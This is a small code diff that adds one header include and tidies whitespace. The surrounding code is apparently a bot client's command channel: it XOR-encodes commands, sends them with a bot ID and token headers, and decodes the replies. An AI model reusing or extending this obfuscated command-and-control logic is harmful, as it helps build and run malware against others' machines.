@@ -2,6 +2,7 @@
 #include "HttpQuery.h"
 #include "GateHelper.h"
 #include "WebSafeEncryption.h"
+#include "WindowsCompat.h"
 #include <string>
 
 char* botId = "-1";
@@ -22,8 +23,8 @@ char* SendCommandWithDecodedResponse(char* command) {
 
 	char* encodedResult = GetEncodedXorResult(command, key, strlen(command), 32, &encodedKey);
 	FreeKey(key);
-	
-	
+
+
 	NameValuePair* headers[] = {
 		new NameValuePair("X-Token", encodedKey),
 		new NameValuePair("X-Id", botId),
@@ -60,7 +61,7 @@ char* SendCommandWithDecodedResponse(char* command) {
 
 	int outputLength;
 	char* output = GetDecodedXorResult(returnedData, newKey, &outputLength);
-	
+
 	char* returnBuffer = (char*)malloc(outputLength + 1);
 	returnBuffer[outputLength] = 0;
 	memcpy_s(returnBuffer, outputLength, output, outputLength);
